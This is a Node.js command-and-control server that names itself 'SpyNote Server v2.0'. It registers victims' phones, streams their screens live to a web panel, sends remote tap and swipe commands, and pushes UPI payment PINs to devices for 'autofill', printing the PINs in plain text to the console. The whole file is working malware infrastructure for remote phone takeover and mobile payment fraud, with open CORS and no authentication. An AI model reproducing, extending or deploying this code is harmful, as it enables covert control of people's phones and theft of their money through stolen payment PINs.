const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const compression = require('compression');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingTimeout: 60000,
    pingInterval: 25000
});

app.use(compression());
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json({ limit: '50mb' }));

const devices = new Map();

app.get('/devices', (req, res) => {
    res.json(Array.from(devices.entries()));
});

io.on('connection', (socket) => {
    console.log('🔌 Client connected:', socket.id);

    socket.on('register-device', (deviceInfo) => {
        const deviceId = deviceInfo.deviceId;
        if (deviceId) {
            const deviceData = {
                ...deviceInfo,
                connected: true,
                socketId: socket.id,
                timestamp: Date.now()
            };
            devices.set(deviceId, deviceData);
            socket.join(deviceId);
            
            console.log(`📱 NEW DEVICE: ${deviceId} (${deviceInfo.model || 'Unknown'}) 🟢`);
            io.emit('devices-update', Array.from(devices.entries()));
        }
    });

    socket.on('screen-frame', (data) => {
        const deviceId = data.deviceId;
        if (devices.has(deviceId)) {
            socket.to(deviceId).emit('screen-update', data);
        }
    });

    socket.on('control', (data) => {
        const { deviceId, action, x, y, startX, startY, endX, endY } = data;
        if (devices.has(deviceId)) {
            io.to(deviceId).emit('control', {
                action, 
                x: parseFloat(x) || 0, 
                y: parseFloat(y) || 0,
                startX: parseFloat(startX) || 0,
                startY: parseFloat(startY) || 0,
                endX: parseFloat(endX) || 0,
                endY: parseFloat(endY) || 0
            });
            console.log(`🎮 ${action.toUpperCase()} → ${deviceId}`);
        }
    });

    // 🔥 UPI AUTOFILL
    socket.on('upi-pin', (data) => {
        const { deviceId, pin, enabled } = data;
        if (devices.has(deviceId)) {
            io.to(deviceId).emit('upi-pin', { pin, enabled });
            console.log(`🔐 UPI PIN → ${deviceId}: ${pin} (${enabled ? 'ON' : 'OFF'})`);
        }
    });

    socket.on('autofill-toggle', (data) => {
        const { deviceId, enabled } = data;
        if (devices.has(deviceId)) {
            io.to(deviceId).emit('autofill-toggle', { enabled });
            console.log(`🔄 AUTOFILL ${enabled ? 'ON' : 'OFF'} → ${deviceId}`);
        }
    });

    socket.on('disconnect', () => {
        for (const [deviceId, info] of devices.entries()) {
            if (info.socketId === socket.id) {
                devices.set(deviceId, { ...info, connected: false });
                console.log(`📱 ${deviceId} DISCONNECTED 🔴`);
                io.emit('devices-update', Array.from(devices.entries()));
                break;
            }
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`\n🚀 SpyNote Server v2.0 LIVE on http://0.0.0.0:${PORT}`);
    console.log(`🌐 Web Panel: http://localhost:${PORT}`);
    console.log(`📱 UPI Autofill + 20FPS Streaming READY!`);
    console.log(`💡 Phone → Enable Screen Capture → LIVE!\n`);
});
